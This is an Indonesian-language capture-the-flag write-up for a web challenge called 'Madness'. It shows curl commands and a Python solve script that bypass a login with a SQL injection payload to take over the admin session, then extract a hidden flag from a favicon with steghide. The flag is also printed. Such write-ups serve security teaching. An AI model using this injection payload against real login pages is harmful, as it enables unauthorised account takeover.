# Madness

Challenge ini gabung dua hal: login SQL injection buat nyolong sesi admin, lalu stego di `favicon` yang dibuka pakai passphrase dari halaman admin.

## Langkah solve

### 1. Enumerasi route dan fitur

Halaman utama redirect ke `/login`. Setelah bikin akun biasa, surface yang kelihatan:

- `/gallery`
- `/profile`
- `/admin_only`

Komentar di `/admin_only` ngasih hint kalau ada password yang tersembunyi dan flag bukan ada langsung di halaman itu.

### 2. Temu SQL injection di login

Payload ini bikin login lolos:

```bash
curl -sk -c adminreal.txt -X POST https://web-madness.tracebash.xyz/login \
  --data-urlencode "username=' OR username='admin' -- " \
  --data-urlencode 'password=x' -i
```

Kalau sesi hasil payload itu dipakai ke `/profile`, profil yang kebuka adalah user admin:

```bash
curl -sk -b adminreal.txt https://web-madness.tracebash.xyz/profile
```

Output pentingnya:

```html
<h1>admin</h1>
<p style="color: #cbd5e1;">admin@x.com</p>
```

### 3. Ambil passphrase dari admin page

Dengan sesi admin hasil SQLi, buka `/admin_only`:

```bash
curl -sk -b adminreal.txt https://web-madness.tracebash.xyz/admin_only
```

Di sana ada secret:

```html
<div style="color: #64748b; font-size: 0.85rem; margin-bottom: 1.5rem; letter-spacing: 2px;">M4dn3sS!</div>
```

Halaman yang sama juga bilang:

```text
delete that robotsss.txt before production deployment
```

`/robotsss.txt` cuma decoy, tapi hint "uploaded by admins only" ngedorong ke file gambar/stego.

### 4. Extract stego dari favicon

`/favicon.ico` ternyata bukan file ico, tapi JPEG. Passphrase dari admin page bisa dipakai buat extract data tersembunyi:

```bash
curl -sk https://web-madness.tracebash.xyz/favicon.ico -o fav.ico
file fav.ico
steghide extract -sf fav.ico -p 'M4dn3sS!' -xf stego_out
cat stego_out
```

Output:

```text
fav.ico: JPEG image data, JFIF standard 1.01
TBCTF{1_5u5p3c7_y0u_4r3_4n_0v3r7h1nk3r}
```

## Solve script

```python
import re
import subprocess
from pathlib import Path

BASE = "https://web-madness.tracebash.xyz"


def sh(cmd: str) -> str:
    return subprocess.check_output(cmd, shell=True, text=True).strip()


cookie_file = Path("adminreal.txt")
favicon_file = Path("fav.ico")
out_file = Path("stego_out")

sh(
    "curl -sk -c adminreal.txt -X POST "
    f"{BASE}/login "
    "--data-urlencode \"username=' OR username='admin' -- \" "
    "--data-urlencode 'password=x' >/dev/null"
)

admin_page = sh(f"curl -sk -b {cookie_file} {BASE}/admin_only")
passphrase = re.search(r\">(M4dn3sS!)<", admin_page).group(1)

sh(f"curl -sk {BASE}/favicon.ico -o {favicon_file}")
sh(f"steghide extract -sf {favicon_file} -p '{passphrase}' -xf {out_file} -f >/dev/null")

print(out_file.read_text().strip())
```

Jalankan:

```bash
python3 solve.py
```

## Flag

```text
TBCTF{1_5u5p3c7_y0u_4r3_4n_0v3r7h1nk3r}
```
